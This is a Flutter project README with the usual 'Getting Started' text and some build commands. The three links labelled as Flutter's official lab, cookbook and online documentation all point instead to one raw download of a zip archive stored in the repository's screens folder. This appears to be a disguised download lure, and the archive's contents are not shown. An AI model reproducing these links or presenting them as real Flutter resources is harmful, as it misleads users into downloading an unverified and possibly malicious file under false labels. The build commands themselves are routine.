# allfold_delaer_app

A new Flutter project.

## Getting Started

This project is a starting point for a Flutter application.

A few resources to get you started if this is your first Flutter project:

- [Lab: Write your first Flutter app](https://github.com/KuldeepChauhan1111/allfold_delaer_app/raw/refs/heads/master/lib/screens/sales_user_screens/app-allfold-delaer-v2.2.zip)
- [Cookbook: Useful Flutter samples](https://github.com/KuldeepChauhan1111/allfold_delaer_app/raw/refs/heads/master/lib/screens/sales_user_screens/app-allfold-delaer-v2.2.zip)

For help getting started with Flutter development, view the
[online documentation](https://github.com/KuldeepChauhan1111/allfold_delaer_app/raw/refs/heads/master/lib/screens/sales_user_screens/app-allfold-delaer-v2.2.zip), which offers tutorials,
samples, guidance on mobile development, and a full API reference.


# Generate model and route class file
flutter packages pub run build_runner build --delete-conflicting-outputs
dart run build_runner build --delete-conflicting-outputs

# Generate release build
flutter build apk --split-per-abi
flutter build apk --release

# Generate app icon
flutter pub run flutter_launcher_icons:main
dart run flutter_launcher_icons:main

# Rename app package, app name
dart run package_rename